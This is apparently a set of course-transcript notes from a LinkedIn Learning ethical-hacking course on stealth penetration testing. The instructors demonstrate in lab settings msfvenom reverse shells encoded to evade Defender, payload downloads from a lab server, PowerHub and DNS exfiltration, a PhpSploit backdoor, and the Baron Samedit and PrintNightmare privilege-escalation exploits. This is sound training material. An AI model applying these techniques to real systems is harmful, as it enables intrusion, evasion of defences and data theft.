...
> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-you-should-know?u=76281980&t=0)** - [Instructor] This is a practical course. We'll be using [Kali Linux](../../Skills/Cybersecurity/Kali%20Linux.md)-based tools to do testing, and we'll be using our own test network and some targets in the Offensive Security online [Penetration Testing](../../Skills/Cybersecurity/Penetration%20Testing.md) lab. You'll need to have a good working knowledge of Kali and a basic foundation of hands-on testing. You should have a working knowledge of [Ethical Hacking](../../Skills/Cybersecurity/Ethical%20Hacking.md) tools, and you should have taken the ethical hacking series of courses. If you've taken the advanced Kali Linux course, that would be an advantage.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [Kali Linux](../../Skills/Cybersecurity/Kali%20Linux.md) (2), [Ethical Hacking](../../Skills/Cybersecurity/Ethical%20Hacking.md) (2), [Penetration Testing](../../Skills/Cybersecurity/Penetration%20Testing.md) (1)
> **Definitions:** is a  (1)
...
> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [Windows](../../Glossary/Service/Windows.md) (3), [Msfvenom](../../Glossary/Framework/Metasploit.md) (2), [Microsoft Defender](../../Skills/Network%20and%20System%20Administration/Microsoft%20Defender.md) (2), [Python](../../Skills/Software%20Development/Python%20(Programming%20Language).md) (1), [Powershell](../../Skills/Network%20and%20System%20Administration/Powershell.md) (1)
...
> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/trying-stealthy-shells?u=76281980&t=0)** - [Narrator] [MSFvenom](../../Glossary/Framework/Metasploit.md) provides an encoding feature which enables us to create stealthy shells using the -e option. Let's check this out and see how effective it is. MSFvenom - p [Windows](../../Glossary/Service/Windows.md)/shell/reverse tcp
>
...
>
> **[3:37](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/trying-stealthy-shells?u=76281980&t=217)** And again in [Powershell](../../Skills/Network%20and%20System%20Administration/Powershell.md) we'll Invoke-WebRequest http 192.169.1.249/zcmd.exe
>
...
>
> **[4:14](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/trying-stealthy-shells?u=76281980&t=254)** that copies over and we can see it in our folder. (pause) [Microsoft Defender](../../Skills/Network%20and%20System%20Administration/Microsoft%20Defender.md) still detects it despite applying encryption to the code. We used to be able to generate shell code using MSFvenom to load our code directly onto a Windows host with little effort. However, the encoding approaches used by MSFvenom are now being detected by Windows [Defender](../../Skills/Network%20and%20System%20Administration/Microsoft%20Defender.md) and it's become difficult for an inexperienced, ethical hacker to get a payload running. Windows has introduced the Antimalware Scan Interface which enables Windows Defender to scan scripts and the Windows Defender Advanced Threat Protection with its ability to leverage machine learning. Makes Windows a formidable challenge for the pen tester. Consequently, we need to have far more effective stealth techniques for our real world testing.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [Windows](../../Glossary/Service/Windows.md) (10), [Msfvenom](../../Glossary/Framework/Metasploit.md) (5), [Defender](../../Skills/Network%20and%20System%20Administration/Microsoft%20Defender.md) (3), [Powershell](../../Skills/Network%20and%20System%20Administration/Powershell.md) (1), [Microsoft Defender](../../Skills/Network%20and%20System%20Administration/Microsoft%20Defender.md) (1)
> **Non-Speech:** (typing) (6)
...
>
> **[1:29](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/leaving-footprints?u=76281980&t=89)** we find an event code 10116 warning, which indicates that we tried to do something, but didn't have the correct permission. Let's check the application and services logs. [Microsoft](../../Instructors/Artificial%20Intelligence%20(AI)/Microsoft.md), Windows, and we'll check first of all Windows [Defender](../../Skills/Network%20and%20System%20Administration/Microsoft%20Defender.md), operational logs. Again, find Sam Spade account. And we can see the defender has logged the detection of our shell as a warning. And as we scroll down we can see it's been logged against SSpade01. We can also check in the same area our [Powershell](../../Skills/Network%20and%20System%20Administration/Powershell.md) logs, the operational logs. Let's take a look at the log for executing a remote command and filter the current logs on event ID 4104. which is execute a remote command. On the main page, we see this records our username showing we executed a remote command. If we check the next entry and scroll down a little bit, we can see that our Meterpreter script has been logged.
>
...
> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [Windows](../../Glossary/Service/Windows.md) (6), [Defender](../../Skills/Network%20and%20System%20Administration/Microsoft%20Defender.md) (2), [Microsoft](../../Instructors/Artificial%20Intelligence%20(AI)/Microsoft.md) (1), [Powershell](../../Skills/Network%20and%20System%20Administration/Powershell.md) (1)
> **CLI Commands:** find (6)
...
> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [Windows](../../Glossary/Service/Windows.md) (1), [Powershell](../../Skills/Network%20and%20System%20Administration/Powershell.md) (1), [Linux](../../Skills/Network%20and%20System%20Administration/Linux.md) (1), [Netcat](../../Glossary/Tool/Netcat.md) (1), [Microsoft](../../Instructors/Artificial%20Intelligence%20(AI)/Microsoft.md) (1)
...
> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-powerhub?u=76281980&t=0)** - [Narrator] While we can attempt to copy standard tools such as [Netcat](../../Glossary/Tool/Netcat.md) into [Windows](../../Glossary/Service/Windows.md), we're often defeated by windows [defender](../../Skills/Network%20and%20System%20Administration/Microsoft%20Defender.md) which detects these as malware tools. PowerHub has been developed as a more sophisticated and stealthy means of transferring files in and out of a target. We can download this from Adrian Vollmer [GitHub](../../Skills/Software%20Development/GitHub.md) site shown here. Okay, let's do exactly that. [Git](../../Skills/Software%20Development/Git.md) clone HTTPS [github.com](https://github.com),
>
...
>
> **[0:45](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-powerhub?u=76281980&t=45)** Okay, and let's start PowerHub up in its simplest form. We'll CD PowerHub and [Python](../../Skills/Software%20Development/Python%20(Programming%20Language).md) three powerhub.py.
>
...
>
> **[4:06](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-powerhub?u=76281980&t=246)** plus dollar underscore. And we're connected to PowerHub. We can list the hub modules that are available, list slash hub modules. And we can see there are the 30 that we loaded earlier into PowerHub. We can start exfiltrating our reconnaissance information to PowerHub now. Let's start our reconnaissance with a basic check of the local groups. Get dash local group convert two [JSON](../../Skills/Web%20Development/JSON.md),
>
...
> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [JSON](../../Skills/Web%20Development/JSON.md) (6), [Windows](../../Glossary/Service/Windows.md) (3), [GitHub](../../Skills/Software%20Development/GitHub.md) (2), [Git](../../Skills/Software%20Development/Git.md) (2), [Powershell](../../Skills/Network%20and%20System%20Administration/Powershell.md) (2)
...
> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-the-phpsploit-shell?u=76281980&t=0)** - [Instructor] PhpSploit is a stealthy backdoor post-implementation tool which provides a shell command interface to a backdoor [PHP](../../Skills/Software%20Development/PHP.md) server. The implant itself is a single line of PHP code, which needs to be installed at some location in the website. We'll clone the tool [Git](../../Skills/Software%20Development/Git.md) clone HTTPS [github.com](https://github.com) nil 0x42 PhpSploit.
>
...
> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [PHP](../../Skills/Software%20Development/PHP.md) (10), [Git](../../Skills/Software%20Development/Git.md) (1), [GitHub](../../Skills/Software%20Development/GitHub.md) (1), [OWASP](../../Skills/Cybersecurity/OWASP.md) (1), [HTML](../../Skills/Web%20Development/HTML.md) (1)
...
> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/stealthy-linux-enumeration?u=76281980&t=0)** - [LinPEAS](../../Glossary/Tool/LinPEAS.md) is an enumeration script which can be used to search for privilege escalation paths, on a [Linux](../../Skills/Network%20and%20System%20Administration/Linux.md) system. It's fairly quiet as it doesn't write anything to disc. It also runs fairly quickly, needing only a minute or so to do the basic checks and it has a limited brute force check included. We'll be stealthy and we'll run this from memory. We can download LinPEAS directly from [GitHub](../../Skills/Software%20Development/GitHub.md).
>
...
> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [LinPEAS](../../Glossary/Tool/LinPEAS.md) (10), [Linux](../../Skills/Network%20and%20System%20Administration/Linux.md) (2), [GitHub](../../Skills/Software%20Development/GitHub.md) (1), [MySQL](../../Skills/Software%20Development/MySQL.md) (1)
...
> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/stealthy-windows-enumeration?u=76281980&t=0)** - [Tutor] [WinPEAS](../../Glossary/Tool/WinPEAS.md) is the [Windows](../../Glossary/Service/Windows.md) variant of the [LinPEAS](../../Glossary/Tool/LinPEAS.md) privileged escalation tool and is available from Carlos Polop site. There's an obfuscate and obfuscated versions available. I've downloaded the obfuscated executable to Carly already and have a [Python](../../Skills/Software%20Development/Python%20(Programming%20Language).md) web server open. So let's copy it over to our target. We'll invoke web request http 192.168.1.249/
>
...
> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [WinPEAS](../../Glossary/Tool/WinPEAS.md) (11), [Windows](../../Glossary/Service/Windows.md) (3), [Defender](../../Skills/Network%20and%20System%20Administration/Microsoft%20Defender.md) (3), [LinPEAS](../../Glossary/Tool/LinPEAS.md) (2), [Python](../../Skills/Software%20Development/Python%20(Programming%20Language).md) (1)
...
>
> **[1:57](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/setting-up-and-using-an-ssh-tunnel?u=76281980&t=117)** - L indicates that this is a local port forwarding request on port 8080 to local host and to go to port 80 on the target. To set this up on the target, we need to log into [Ubuntu](../../Skills/Web%20Development/Ubuntu.md)@192.168.1.151, which is our Mutillidae server. And we now have a tunnel set up. SSH has created the tunnel and we've now got local access from curl to the Mutillidae web server. Let's try it out. And we'll go to 127.0.0.1:8080, which is our local proxy and we're looking for the Mutillidae website. And we can see the utility dye webpage. Let's see how we close this down. We'll use ps aux a to get the background process ID and kill it. ps aux and we're looking for grep ssh.
>
...
> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exfiltration-via-dns?u=76281980&t=0)** - Another protocol, which is often used for exfiltration is DNS. We can use the DNS steel tool to demonstrate how DNS exfiltration works. DNS steel is a DNS server, which receives exfiltrated data. Let's get the tool. Get. And if we just go to DN steel we can start DN steel using its default settings. And this will establish the DNS server on our current system which is using IP address 1 9 2 1 6 8 1 2 4 9. We'll use [Python](../../Skills/Software%20Development/Python%20(Programming%20Language).md) two for this. Pseudo Python, 2.7, DN steel.py, and we give it our server address 192.168.1.249. And we use minus Z minus V. Okay, we've now got our DNS destination server set up on port 53. The minus said switch indicates the incoming DNS will be compressed with G zip. We'll also set verbose mode with minus V to see details of the traffic received. Note, the two [Forms](../../Skills/Web%20Development/Forms.md) of client command. These are both single line command shell scripts. We'll be using a variation of the first. I'm on my target system, and I'll use DNS to exfiltrate some data using the first script provided by DN steel. I have it in a file called sadness.sh, so let's have a look at that.
>
...
> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [Python](../../Skills/Software%20Development/Python%20(Programming%20Language).md) (3), [Forms](../../Skills/Web%20Development/Forms.md) (1)
...
> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-baron-samedit-to-escalate-in-linux?u=76281980&t=0)** - [Instructor] In 2021, a vulnerability was identified in the [Linux](../../Skills/Network%20and%20System%20Administration/Linux.md) sudo tool and it enabled and authorized a non-privileged user to gain root privileges as shown in this website. It affects sudo version 1.8.31. We're on our Scorpio system, so let's check whether we're vulnerable. We can firstly check our sudo version, sudo --version. And we are 1.8.31. We can run a check to verify the vulnerability hasn't been patched using sudo edits, sudoedit -s / we get the message, not a regular file. That's a sign our target is vulnerable. Let's download and build the exploit. So we'll [Git](../../Skills/Software%20Development/Git.md) clone https.
>
...
> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [Linux](../../Skills/Network%20and%20System%20Administration/Linux.md) (1), [Git](../../Skills/Software%20Development/Git.md) (1)
...
> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/escalating-through-a-nightmare?u=76281980&t=0)** - [Instructor] An exploit called PrintNightmare became a critical issue for many IT teams in mid 2021. It affected all [Windows](../../Glossary/Service/Windows.md) systems and enabled the attacker to quickly get root privileges. It's an exploit which affects the Print Spooler service. Let's take a look at how we can use it against an unpatched system. We'll be using the approach published here to show how this works. There's a machine on the main Hack The Box system, called Heist, which we'll use as a target for running the PrintNightmare exploit. It's IP address is 10.10.10.149. The first thing we need to do is to download the PrintNightmare proof of concept, which we'll rename to just Nightmare. [Git](../../Skills/Software%20Development/Git.md) clone, and we'll clone that into the Nightmare repository. We need to have authenticated user access to run PrintNightmare. For the purposes of this demonstration, we'll skip the initial exploitive Heist, and go directly to using a set of user credentials. The user is called Chase, the domain name is Supportdesk, and we know the password. We'll connect to the server using a pentesting client for windows management called evil-winrm. We can install this as a Ruby gem. Sudo gem install evil-winrm.
>
...
>
> **[2:42](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/escalating-through-a-nightmare?u=76281980&t=162)** Okay, that's uploaded, and created a new [Powershell](../../Skills/Network%20and%20System%20Administration/Powershell.md) module on the target. Let's import it. Import-Module./CVE-2021-1675.ps1.
>
...
> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [Windows](../../Glossary/Service/Windows.md) (3), [Git](../../Skills/Software%20Development/Git.md) (1), [Powershell](../../Skills/Network%20and%20System%20Administration/Powershell.md) (1)
...
> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [Active Directory](../../Skills/Network%20and%20System%20Administration/Active%20Directory.md) (11), [Powershell](../../Skills/Network%20and%20System%20Administration/Powershell.md) (2), [GitHub](../../Skills/Software%20Development/GitHub.md) (1), [Hashcat](../../Glossary/Tool/Hashcat.md) (1), [John the Ripper](../../Glossary/Tool/John%20the%20Ripper.md) (1)
...
> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-s-next?u=76281980&t=0)** - [Malcolm] In this course, you've taken another step in [Ethical Hacking](../../Skills/Cybersecurity/Ethical%20Hacking.md) by learning about some advanced techniques for testing. However, your learning doesn't stop here. There's always new tools and techniques being developed and there are many specialist areas of learning for you to focus on. I'd like to invite you to go to my [LinkedIn](../../Skills/Web%20Development/LinkedIn.md) Learning page and check out my other security courses. You'll find a number of security courses on my page, including [SQL](../../Skills/Data%20Science/SQL.md) Injections, [Burp Suite](../../Skills/Cybersecurity/Burp%20Suite.md), and [Active Directory](../../Skills/Network%20and%20System%20Administration/Active%20Directory.md). There's always new things to learn in the wider field of information and [Cybersecurity](../../Topics/Cybersecurity.md), so check out the full security segment of the LinkedIn library, where new courses are added regularly. You'll find courses on all aspects of security, as well as a full learning path to certified ethical hacker.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [LinkedIn](../../Skills/Web%20Development/LinkedIn.md) (2), [Ethical Hacking](../../Skills/Cybersecurity/Ethical%20Hacking.md) (1), [SQL](../../Skills/Data%20Science/SQL.md) (1), [Burp Suite](../../Skills/Cybersecurity/Burp%20Suite.md) (1), [Active Directory](../../Skills/Network%20and%20System%20Administration/Active%20Directory.md) (1)
> **CLI Commands:** find (2)
> **Env Vars:** sql (1)
> **UI Navigation:** go to (1)
> **Speakers:** - [malcolm] (1)
...
← [Burp Suite Essential Training](Burp%20Suite%20Essential%20Training.md) | **8 of 8**
...
- [Kali Linux for Advanced Pen Testing and Ethical Hacking](Kali%20Linux%20for%20Advanced%20Pen%20Testing%20and%20Ethical%20Hacking.md) — Penetration Testing, Ethical Hacking
- [Ethical Hacking- System Hacking](Ethical%20Hacking-%20System%20Hacking.md) — Penetration Testing, Ethical Hacking
